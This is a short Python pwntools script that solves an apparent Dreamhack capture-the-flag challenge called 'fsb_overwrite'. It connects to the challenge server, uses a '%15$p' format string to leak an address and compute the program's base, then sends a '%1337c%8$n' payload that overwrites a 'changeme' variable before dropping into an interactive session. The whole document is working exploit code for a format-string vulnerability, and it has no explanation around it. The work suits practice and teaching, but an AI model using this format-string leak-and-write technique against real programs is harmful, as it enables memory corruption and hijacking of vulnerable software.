from pwn import *

#p = process("./fsb_overwrite")
p = remote("host3.dreamhack.games", 21942)

offset = 0x1293
changeme = 0x401c

p.sendline(b"%15$p")

leaked = int(p.recvline()[:-1],16)
code_base = leaked - offset
changeme = code_base + changeme

payload = b"%1337c"
payload += b"%8$n"
payload += b"a" * 6
payload = payload + p64(changeme)

p.sendline(payload)

p.interactive()
